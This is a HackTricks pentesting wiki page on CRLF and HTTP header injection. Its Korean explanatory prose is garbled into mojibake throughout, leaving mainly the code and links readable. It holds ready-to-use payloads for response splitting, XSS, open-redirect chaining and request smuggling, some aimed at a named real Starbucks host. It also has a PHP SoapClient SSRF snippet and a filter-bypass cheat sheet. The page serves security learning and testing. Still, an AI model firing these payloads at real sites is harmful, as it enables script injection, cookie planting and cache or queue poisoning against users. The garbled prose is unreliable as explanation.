# CRLF (%0D%0A) Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### CRLF

ìºë¦¬ì§€ ë¦¬í„´(CR)ê³¼ ë¼ì¸ í”¼ë“œ(LF)ëŠ” CRLFë¡œ ì•Œë ¤ì§„ íŠ¹ìˆ˜ ë¬¸ì ì‹œí€€ìŠ¤ë¡œ, HTTP í”„ë¡œí† ì½œì—ì„œ í•œ ì¤„ì˜ ëì´ë‚˜ ìƒˆë¡œìš´ ì¤„ì˜ ì‹œì‘ì„ ë‚˜íƒ€ë‚´ëŠ” ë° ì‚¬ìš©ë©ë‹ˆë‹¤. ì›¹ ì„œë²„ì™€ ë¸Œë¼ìš°ì €ëŠ” CRLFë¥¼ ì‚¬ìš©í•˜ì—¬ HTTP í—¤ë”ì™€ ì‘ë‹µ ë³¸ë¬¸ì„ êµ¬ë¶„í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë¬¸ìëŠ” Apache ë° Microsoft IISì™€ ê°™ì€ ë‹¤ì–‘í•œ ì›¹ ì„œë²„ ìœ í˜•ì—ì„œ HTTP/1.1 í†µì‹ ì— ë³´í¸ì ìœ¼ë¡œ ì‚¬ìš©ë©ë‹ˆë‹¤.

### CRLF Injection Vulnerability

CRLF ì¸ì ì…˜ì€ ì‚¬ìš©ì ì œê³µ ì…ë ¥ì— CR ë° LF ë¬¸ìë¥¼ ì‚½ì…í•˜ëŠ” ê²ƒì„ í¬í•¨í•©ë‹ˆë‹¤. ì´ ì‘ì—…ì€ ì„œë²„, ì• í”Œë¦¬ì¼€ì´ì…˜ ë˜ëŠ” ì‚¬ìš©ìê°€ ì‚½ì…ëœ ì‹œí€€ìŠ¤ë¥¼ í•˜ë‚˜ì˜ ì‘ë‹µì˜ ëê³¼ ë‹¤ë¥¸ ì‘ë‹µì˜ ì‹œì‘ìœ¼ë¡œ í•´ì„í•˜ë„ë¡ ì˜¤ë„í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ ë¬¸ìëŠ” ë³¸ì§ˆì ìœ¼ë¡œ í•´ë¡­ì§€ ì•Šì§€ë§Œ, ì˜ëª» ì‚¬ìš©ë  ê²½ìš° HTTP ì‘ë‹µ ë¶„í•  ë° ê¸°íƒ€ ì•…ì˜ì ì¸ í™œë™ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

### Example: CRLF Injection in a Log File

[Example from here](https://www.invicti.com/blog/web-security/crlf-http-header/)

ê´€ë¦¬ íŒ¨ë„ì˜ ë¡œê·¸ íŒŒì¼ì´ `IP - Time - Visited Path` í˜•ì‹ì„ ë”°ë¥´ëŠ” ê²½ìš°ë¥¼ ê³ ë ¤í•´ ë³´ì‹­ì‹œì˜¤. ì¼ë°˜ì ì¸ í•­ëª©ì€ ë‹¤ìŒê³¼ ê°™ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
123.123.123.123 - 08:15 - /index.php?page=home
```
ê³µê²©ìëŠ” CRLF ì£¼ì…ì„ ì´ìš©í•˜ì—¬ ì´ ë¡œê·¸ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. HTTP ìš”ì²­ì— CRLF ë¬¸ìë¥¼ ì£¼ì…í•¨ìœ¼ë¡œì¨, ê³µê²©ìëŠ” ì¶œë ¥ ìŠ¤íŠ¸ë¦¼ì„ ë³€ê²½í•˜ê³  ë¡œê·¸ í•­ëª©ì„ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì£¼ì…ëœ ì‹œí€€ìŠ¤ëŠ” ë¡œê·¸ í•­ëª©ì„ ë‹¤ìŒê³¼ ê°™ì´ ë³€í˜•í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
/index.php?page=home&%0d%0a127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
ì—¬ê¸°ì„œ `%0d`ì™€ `%0a`ëŠ” CRê³¼ LFì˜ URL ì¸ì½”ë”© í˜•íƒœë¥¼ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. ê³µê²© í›„, ë¡œê·¸ëŠ” ì˜ëª»ëœ ë°©ì‹ìœ¼ë¡œ í‘œì‹œë  ê²ƒì…ë‹ˆë‹¤:
```
IP - Time - Visited Path

123.123.123.123 - 08:15 - /index.php?page=home&
127.0.0.1 - 08:15 - /index.php?page=home&restrictedaction=edit
```
ê³µê²©ìëŠ” localhost(ì„œë²„ í™˜ê²½ ë‚´ì—ì„œ ì¼ë°˜ì ìœ¼ë¡œ ì‹ ë¢°ë˜ëŠ” ì—”í‹°í‹°)ê°€ ì‘ì—…ì„ ìˆ˜í–‰í•œ ê²ƒì²˜ëŸ¼ ë³´ì´ê²Œ í•˜ì—¬ ì•…ì˜ì ì¸ í™œë™ì„ ìˆ¨ê¹ë‹ˆë‹¤. ì„œë²„ëŠ” `%0d%0a`ë¡œ ì‹œì‘í•˜ëŠ” ì¿¼ë¦¬ì˜ ì¼ë¶€ë¥¼ ë‹¨ì¼ ë§¤ê°œë³€ìˆ˜ë¡œ í•´ì„í•˜ê³ , `restrictedaction` ë§¤ê°œë³€ìˆ˜ëŠ” ë³„ë„ì˜ ì…ë ¥ìœ¼ë¡œ êµ¬ë¬¸ ë¶„ì„ë©ë‹ˆë‹¤. ì¡°ì‘ëœ ì¿¼ë¦¬ëŠ” í•©ë²•ì ì¸ ê´€ë¦¬ ëª…ë ¹ì„ íš¨ê³¼ì ìœ¼ë¡œ ëª¨ë°©í•©ë‹ˆë‹¤: `/index.php?page=home&restrictedaction=edit`

### HTTP Response Splitting

#### ì„¤ëª…

HTTP Response Splittingì€ ê³µê²©ìê°€ HTTP ì‘ë‹µì˜ êµ¬ì¡°ë¥¼ ì•…ìš©í•  ë•Œ ë°œìƒí•˜ëŠ” ë³´ì•ˆ ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ êµ¬ì¡°ëŠ” íŠ¹ì • ë¬¸ì ì‹œí€€ìŠ¤ì¸ Carriage Return (CR) ë‹¤ìŒì— Line Feed (LF)ë¥¼ ì‚¬ìš©í•˜ì—¬ í—¤ë”ì™€ ë³¸ë¬¸ì„ êµ¬ë¶„í•˜ë©°, ì´ë¥¼ ì´ì¹­í•˜ì—¬ CRLFë¼ê³  í•©ë‹ˆë‹¤. ê³µê²©ìê°€ ì‘ë‹µ í—¤ë”ì— CRLF ì‹œí€€ìŠ¤ë¥¼ ì‚½ì…í•˜ëŠ” ë° ì„±ê³µí•˜ë©´, ì´í›„ ì‘ë‹µ ë‚´ìš©ì„ íš¨ê³¼ì ìœ¼ë¡œ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ëŸ¬í•œ ìœ í˜•ì˜ ì¡°ì‘ì€ ì‹¬ê°í•œ ë³´ì•ˆ ë¬¸ì œ, íŠ¹íˆ Cross-site Scripting (XSS)ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### HTTP Response Splittingì„ í†µí•œ XSS

1. ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ë‹¤ìŒê³¼ ê°™ì€ ì‚¬ìš©ì ì •ì˜ í—¤ë”ë¥¼ ì„¤ì •í•©ë‹ˆë‹¤: `X-Custom-Header: UserInput`
2. ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì¿¼ë¦¬ ë§¤ê°œë³€ìˆ˜ì—ì„œ `UserInput`ì˜ ê°’ì„ ê°€ì ¸ì˜µë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ "user\_input"ì…ë‹ˆë‹¤. ì ì ˆí•œ ì…ë ¥ ê²€ì¦ ë° ì¸ì½”ë”©ì´ ì—†ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œ ê³µê²©ìëŠ” CRLF ì‹œí€€ìŠ¤ì™€ ì•…ì˜ì ì¸ ì½˜í…ì¸ ë¥¼ í¬í•¨í•˜ëŠ” í˜ì´ë¡œë“œë¥¼ ì‘ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
3. ê³µê²©ìëŠ” íŠ¹ë³„íˆ ì¡°ì‘ëœ 'user\_input'ì„ í¬í•¨í•œ URLì„ ì‘ì„±í•©ë‹ˆë‹¤: `?user_input=Value%0d%0a%0d%0a<script>alert('XSS')</script>`
* ì´ URLì—ì„œ `%0d%0a%0d%0a`ëŠ” CRLFCRLFì˜ URL ì¸ì½”ë”©ëœ í˜•íƒœì…ë‹ˆë‹¤. ì´ëŠ” ì„œë²„ë¥¼ ì†ì—¬ CRLF ì‹œí€€ìŠ¤ë¥¼ ì‚½ì…í•˜ê²Œ í•˜ì—¬ ì„œë²„ê°€ ì´í›„ ë¶€ë¶„ì„ ì‘ë‹µ ë³¸ë¬¸ìœ¼ë¡œ ì²˜ë¦¬í•˜ê²Œ ë§Œë“­ë‹ˆë‹¤.
4. ì„œë²„ëŠ” ê³µê²©ìì˜ ì…ë ¥ì„ ì‘ë‹µ í—¤ë”ì— ë°˜ì˜í•˜ì—¬ ì•…ì˜ì ì¸ ìŠ¤í¬ë¦½íŠ¸ê°€ ì‘ë‹µ ë³¸ë¬¸ì˜ ì¼ë¶€ë¡œ ë¸Œë¼ìš°ì €ì— ì˜í•´ í•´ì„ë˜ëŠ” ì˜ë„í•˜ì§€ ì•Šì€ ì‘ë‹µ êµ¬ì¡°ë¥¼ ì´ˆë˜í•©ë‹ˆë‹¤.

#### ë¦¬ë””ë ‰ì…˜ìœ¼ë¡œ ì´ì–´ì§€ëŠ” HTTP Response Splittingì˜ ì˜ˆ

[https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62](https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62)ì—ì„œ ê°€ì ¸ì˜´

ë¸Œë¼ìš°ì €ì—ì„œ:
```
/%0d%0aLocation:%20http://myweb.com
```
ì„œë²„ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í—¤ë”ë¡œ ì‘ë‹µí•©ë‹ˆë‹¤:
```
Location: http://myweb.com
```
**ë‹¤ë¥¸ ì˜ˆ: (ì¶œì²˜** [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)**)**
```
http://www.example.com/somepage.php?page=%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a%3Cscript%3Ealert(1)%3C/script%3E
```
#### In URL Path

URL ê²½ë¡œ **ë‚´ë¶€ì— í˜ì´ë¡œë“œ**ë¥¼ ì „ì†¡í•˜ì—¬ ì„œë²„ì˜ **ì‘ë‹µ**ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (ì˜ˆì‹œëŠ” [ì—¬ê¸°](https://hackerone.com/reports/192667)ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤):
```
http://stagecafrstore.starbucks.com/%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E
http://stagecafrstore.starbucks.com/%3f%0D%0ALocation://x:1%0D%0AContent-Type:text/html%0D%0AX-XSS-Protection%3a0%0D%0A%0D%0A%3Cscript%3Ealert(document.domain)%3C/script%3E
```
Check more examples in:

{% embed url="https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/crlf.md" %}

### HTTP í—¤ë” ì£¼ì…

HTTP í—¤ë” ì£¼ì…ì€ ì¢…ì¢… CRLF (Carriage Return and Line Feed) ì£¼ì…ì„ í†µí•´ ì•…ìš©ë˜ë©°, ê³µê²©ìê°€ HTTP í—¤ë”ë¥¼ ì‚½ì…í•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì´ëŠ” XSS (Cross-Site Scripting) í•„í„°ë‚˜ SOP (Same-Origin Policy)ì™€ ê°™ì€ ë³´ì•ˆ ë©”ì»¤ë‹ˆì¦˜ì„ ë¬´ë ¥í™”í•  ìˆ˜ ìˆìœ¼ë©°, CSRF í† í°ê³¼ ê°™ì€ ë¯¼ê°í•œ ë°ì´í„°ì— ëŒ€í•œ ë¬´ë‹¨ ì ‘ê·¼ì´ë‚˜ ì¿ í‚¤ ì‹¬ê¸°ë¥¼ í†µí•œ ì‚¬ìš©ì ì„¸ì…˜ ì¡°ì‘ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### HTTP í—¤ë” ì£¼ì…ì„ í†µí•œ CORS ì•…ìš©

ê³µê²©ìëŠ” HTTP í—¤ë”ë¥¼ ì£¼ì…í•˜ì—¬ CORS (Cross-Origin Resource Sharing)ë¥¼ í™œì„±í™”í•˜ê³ , SOPì— ì˜í•´ ë¶€ê³¼ëœ ì œí•œì„ ìš°íšŒí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì¹¨í•´ëŠ” ì•…ì˜ì ì¸ ì¶œì²˜ì˜ ìŠ¤í¬ë¦½íŠ¸ê°€ ë‹¤ë¥¸ ì¶œì²˜ì˜ ë¦¬ì†ŒìŠ¤ì™€ ìƒí˜¸ì‘ìš©í•  ìˆ˜ ìˆê²Œ í•˜ì—¬, ë³´í˜¸ëœ ë°ì´í„°ì— ì ‘ê·¼í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ì œê³µí•©ë‹ˆë‹¤.

#### CRLFë¥¼ í†µí•œ SSRF ë° HTTP ìš”ì²­ ì£¼ì…

CRLF ì£¼ì…ì€ ì™„ì „íˆ ìƒˆë¡œìš´ HTTP ìš”ì²­ì„ ì‘ì„±í•˜ê³  ì£¼ì…í•˜ëŠ” ë° í™œìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ì™€ ê´€ë ¨ëœ ì£¼ëª©í•  ë§Œí•œ ì˜ˆëŠ” PHPì˜ `SoapClient` í´ë˜ìŠ¤ì˜ ì·¨ì•½ì ìœ¼ë¡œ, íŠ¹íˆ `user_agent` ë§¤ê°œë³€ìˆ˜ ë‚´ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. ì´ ë§¤ê°œë³€ìˆ˜ë¥¼ ì¡°ì‘í•¨ìœ¼ë¡œì¨ ê³µê²©ìëŠ” ì¶”ê°€ í—¤ë”ì™€ ë³¸ë¬¸ ë‚´ìš©ì„ ì‚½ì…í•˜ê±°ë‚˜, ì‹¬ì§€ì–´ ì™„ì „íˆ ìƒˆë¡œìš´ HTTP ìš”ì²­ì„ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì•„ë˜ëŠ” ì´ ì•…ìš©ì„ ë³´ì—¬ì£¼ëŠ” PHP ì˜ˆì œì…ë‹ˆë‹¤:
```php
$target = 'http://127.0.0.1:9090/test';
$post_string = 'variable=post value';
$crlf = array(
'POST /proxy HTTP/1.1',
'Host: local.host.htb',
'Cookie: PHPSESSID=[PHPSESSID]',
'Content-Type: application/x-www-form-urlencoded',
'Content-Length: '.(string)strlen($post_string),
"\r\n",
$post_string
);

$client = new SoapClient(null,
array(
'uri'=>$target,
'location'=>$target,
'user_agent'=>"IGN\r\n\r\n".join("\r\n",$crlf)
)
);

# Put a netcat listener on port 9090
$client->__soapCall("test", []);
```
### Header Injection to Request Smuggling

ì´ ê¸°ìˆ ê³¼ ì ì¬ì ì¸ ë¬¸ì œì— ëŒ€í•œ ìì„¸í•œ ì •ë³´ëŠ” [**ì›ë³¸ ì†ŒìŠ¤ í™•ì¸**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)ì„ ì°¸ì¡°í•˜ì„¸ìš”.

ì´ˆê¸° ìš”ì²­ì— ì‘ë‹µí•œ í›„ **ë°±ì—”ë“œê°€ ì—°ê²°ì„ ìœ ì§€í•˜ë„ë¡** í•„ìˆ˜ í—¤ë”ë¥¼ ì£¼ì…í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```
GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0a HTTP/1.1
```
ì´í›„ ë‘ ë²ˆì§¸ ìš”ì²­ì„ ì§€ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì‹œë‚˜ë¦¬ì˜¤ëŠ” ì¼ë°˜ì ìœ¼ë¡œ [HTTP request smuggling](http-request-smuggling/)ê³¼ ê´€ë ¨ì´ ìˆìœ¼ë©°, ì—¬ê¸°ì„œ ì„œë²„ê°€ ì£¼ì… í›„ ì¶”ê°€í•œ í—¤ë”ë‚˜ ë³¸ë¬¸ ìš”ì†Œê°€ ë‹¤ì–‘í•œ ë³´ì•ˆ ì·¨ì•½ì ì„ ì´ˆë˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

**ì•…ìš©:**

1. **ì•…ì˜ì ì¸ ì ‘ë‘ì‚¬ ì£¼ì…**: ì´ ë°©ë²•ì€ ì•…ì˜ì ì¸ ì ‘ë‘ì‚¬ë¥¼ ì§€ì •í•˜ì—¬ ë‹¤ìŒ ì‚¬ìš©ìì˜ ìš”ì²­ì´ë‚˜ ì›¹ ìºì‹œë¥¼ ì˜¤ì—¼ì‹œí‚¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/redirplz%20HTTP/1.1%0d%0aHost:%20oastify.com%0d%0a%0d%0aContent-Length:%2050%0d%0a%0d%0a HTTP/1.1`

2. **ì‘ë‹µ í ì˜¤ì—¼ì„ ìœ„í•œ ì ‘ë‘ì‚¬ ì œì‘**: ì´ ì ‘ê·¼ë²•ì€ í›„í–‰ ì“°ë ˆê¸°ì™€ ê²°í•©ë  ë•Œ ì™„ì „í•œ ë‘ ë²ˆì§¸ ìš”ì²­ì„ í˜•ì„±í•˜ëŠ” ì ‘ë‘ì‚¬ë¥¼ ë§Œë“œëŠ” ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ì‘ë‹µ í ì˜¤ì—¼ì„ ìœ ë°œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆì‹œëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

`GET /%20HTTP/1.1%0d%0aHost:%20redacted.net%0d%0aConnection:%20keep-alive%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aFoo:%20bar HTTP/1.1`

### Memcache Injection

MemcacheëŠ” **ëª…í™•í•œ í…ìŠ¤íŠ¸ í”„ë¡œí† ì½œì„ ì‚¬ìš©í•˜ëŠ” í‚¤-ê°’ ì €ì¥ì†Œ**ì…ë‹ˆë‹¤. ìì„¸í•œ ë‚´ìš©ì€ ë‹¤ìŒì„ ì°¸ì¡°í•˜ì‹­ì‹œì˜¤:

{% content-ref url="../network-services-pentesting/11211-memcache/" %}
[11211-memcache](../network-services-pentesting/11211-memcache/)
{% endcontent-ref %}

**ì „ì²´ ì •ë³´ëŠ”**[ **ì›ë³¸ ì‘ì„±ë¬¼**](https://www.sonarsource.com/blog/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/) **ì„ ì½ì–´ë³´ì‹­ì‹œì˜¤.**

í”Œë«í¼ì´ **HTTP ìš”ì²­ì—ì„œ ë°ì´í„°ë¥¼ ê°€ì ¸ì™€ ì´ë¥¼ ì •í™”í•˜ì§€ ì•Šê³ ** **memcache** ì„œë²„ì— **ìš”ì²­**ì„ ìˆ˜í–‰í•˜ëŠ” ê²½ìš°, ê³µê²©ìëŠ” ì´ ë™ì‘ì„ ì•…ìš©í•˜ì—¬ **ìƒˆë¡œìš´ memcache ëª…ë ¹ì„ ì£¼ì…**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´, ì›ë˜ ë°œê²¬ëœ ì·¨ì•½ì ì—ì„œëŠ” ìºì‹œ í‚¤ê°€ ì‚¬ìš©ìê°€ ì—°ê²°í•´ì•¼ í•  IPì™€ í¬íŠ¸ë¥¼ ë°˜í™˜í•˜ëŠ” ë° ì‚¬ìš©ë˜ì—ˆìœ¼ë©°, ê³µê²©ìëŠ” **memcache ëª…ë ¹ì„ ì£¼ì…**í•˜ì—¬ **ìºì‹œë¥¼ ì˜¤ì—¼ì‹œì¼œ í”¼í•´ìì˜ ì„¸ë¶€ì •ë³´**(ì‚¬ìš©ì ì´ë¦„ ë° ë¹„ë°€ë²ˆí˜¸ í¬í•¨)ë¥¼ ê³µê²©ì ì„œë²„ë¡œ ì „ì†¡í•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤:

<figure><img src="../.gitbook/assets/image (659).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/ba72cd16-2ca0-447b-aa70-5cde302a0b88/body-578d9f9f-1977-4e34-841c-ad870492328f_10.png?w=1322&#x26;h=178&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

ë˜í•œ, ì—°êµ¬ìë“¤ì€ ê³µê²©ìê°€ ì•Œì§€ ëª»í•˜ëŠ” ì‚¬ìš©ìì˜ ì´ë©”ì¼ë¡œ ê³µê²©ìì˜ IPì™€ í¬íŠ¸ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•´ memcache ì‘ë‹µì„ ë¹„ë™ê¸°í™”í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤:

<figure><img src="../.gitbook/assets/image (637).png" alt="https://assets-eu-01.kc-usercontent.com/d0f02280-9dfb-0116-f970-137d713003b6/c6c1f3c4-d244-4bd9-93f7-2c88f139acfa/body-3f9ceeb9-3d6b-4867-a23f-e0e50a46a2e9_14.png?w=1322&#x26;h=506&#x26;auto=format&#x26;fit=crop"><figcaption></figcaption></figure>

### ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ CRLF / HTTP í—¤ë” ì£¼ì… ë°©ì§€ ë°©ë²•

ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ CRLF(ìºë¦¬ì§€ ë¦¬í„´ ë° ë¼ì¸ í”¼ë“œ) ë˜ëŠ” HTTP í—¤ë” ì£¼ì…ì˜ ìœ„í—˜ì„ ì™„í™”í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ì „ëµì´ ê¶Œì¥ë©ë‹ˆë‹¤:

1. **ì‘ë‹µ í—¤ë”ì— ì§ì ‘ ì‚¬ìš©ì ì…ë ¥ í”¼í•˜ê¸°:** ê°€ì¥ ì•ˆì „í•œ ì ‘ê·¼ë²•ì€ ì‚¬ìš©ì ì œê³µ ì…ë ¥ì„ ì‘ë‹µ í—¤ë”ì— ì§ì ‘ í¬í•¨í•˜ì§€ ì•ŠëŠ” ê²ƒì…ë‹ˆë‹¤.
2. **íŠ¹ìˆ˜ ë¬¸ì ì¸ì½”ë”©:** ì§ì ‘ ì‚¬ìš©ì ì…ë ¥ì„ í”¼í•  ìˆ˜ ì—†ëŠ” ê²½ìš°, CR(ìºë¦¬ì§€ ë¦¬í„´) ë° LF(ë¼ì¸ í”¼ë“œ)ì™€ ê°™ì€ íŠ¹ìˆ˜ ë¬¸ìë¥¼ ì¸ì½”ë”©í•˜ëŠ” ì „ìš© í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•´ì•¼ í•©ë‹ˆë‹¤. ì´ ê´€í–‰ì€ CRLF ì£¼ì… ê°€ëŠ¥ì„±ì„ ë°©ì§€í•©ë‹ˆë‹¤.
3. **í”„ë¡œê·¸ë˜ë° ì–¸ì–´ ì—…ë°ì´íŠ¸:** ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì—ì„œ ì‚¬ìš©í•˜ëŠ” í”„ë¡œê·¸ë˜ë° ì–¸ì–´ë¥¼ ì •ê¸°ì ìœ¼ë¡œ ìµœì‹  ë²„ì „ìœ¼ë¡œ ì—…ë°ì´íŠ¸í•˜ì‹­ì‹œì˜¤. HTTP í—¤ë” ì„¤ì •ì„ ë‹´ë‹¹í•˜ëŠ” í•¨ìˆ˜ ë‚´ì—ì„œ CR ë° LF ë¬¸ìì˜ ì£¼ì…ì„ ë³¸ì§ˆì ìœ¼ë¡œ í—ˆìš©í•˜ì§€ ì•ŠëŠ” ë²„ì „ì„ ì„ íƒí•˜ì‹­ì‹œì˜¤.

### CHEATSHEET

[Cheatsheet from here](https://twitter.com/NinadMishra5/status/1650080604174667777)
```
1. HTTP Response Splitting
â€¢ /%0D%0ASet-Cookie:mycookie=myvalue (Check if the response is setting this cookie)

2. CRLF chained with Open Redirect
â€¢ //www.google.com/%2F%2E%2E%0D%0AHeader-Test:test2
â€¢ /www.google.com/%2E%2E%2F%0D%0AHeader-Test:test2
â€¢ /google.com/%2F..%0D%0AHeader-Test:test2
â€¢ /%0d%0aLocation:%20http://example.com

3. CRLF Injection to XSS
â€¢ /%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23
â€¢ /%3f%0d%0aLocation:%0d%0aContent-Type:text/html%0d%0aX-XSS-Protection%3a0%0d%0a%0d%0a%3Cscript%3Ealert%28document.domain%29%3C/script%3E

4. Filter Bypass
â€¢ %E5%98%8A = %0A = \u560a
â€¢ %E5%98%8D = %0D = \u560d
â€¢ %E5%98%BE = %3E = \u563e (>)
â€¢ %E5%98%BC = %3C = \u563c (<)
â€¢ Payload = %E5%98%8A%E5%98%8DSet-Cookie:%20test
```
## ìë™ ë„êµ¬

* [https://github.com/Raghavd3v/CRLFsuite](https://github.com/Raghavd3v/CRLFsuite)
* [https://github.com/dwisiswant0/crlfuzz](https://github.com/dwisiswant0/crlfuzz)

## ë¬´ì°¨ë³„ ëŒ€ì… íƒì§€ ëª©ë¡

* [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt](https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/crlf.txt)

## ì°¸ê³  ë¬¸í—Œ

* [**https://www.invicti.com/blog/web-security/crlf-http-header/**](https://www.invicti.com/blog/web-security/crlf-http-header/)
* [**https://www.acunetix.com/websitesecurity/crlf-injection/**](https://www.acunetix.com/websitesecurity/crlf-injection/)
* [**https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning**](https://portswigger.net/research/making-http-header-injection-critical-via-response-queue-poisoning)
* [**https://www.netsparker.com/blog/web-security/crlf-http-header/**](https://www.netsparker.com/blog/web-security/crlf-http-header/)

<figure><img src="../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**ë²„ê·¸ ë°”ìš´í‹° íŒ**: **Intigriti**ì— **ê°€ì…í•˜ì„¸ìš”**, í•´ì»¤ë¥¼ ìœ„í•´ í•´ì»¤ê°€ ë§Œë“  í”„ë¦¬ë¯¸ì—„ **ë²„ê·¸ ë°”ìš´í‹° í”Œë«í¼**ì…ë‹ˆë‹¤! ì˜¤ëŠ˜ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)ì—ì„œ ì €í¬ì™€ í•¨ê»˜í•˜ê³  ìµœëŒ€ **$100,000**ì˜ ë³´ìƒì„ ë°›ê¸° ì‹œì‘í•˜ì„¸ìš”!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

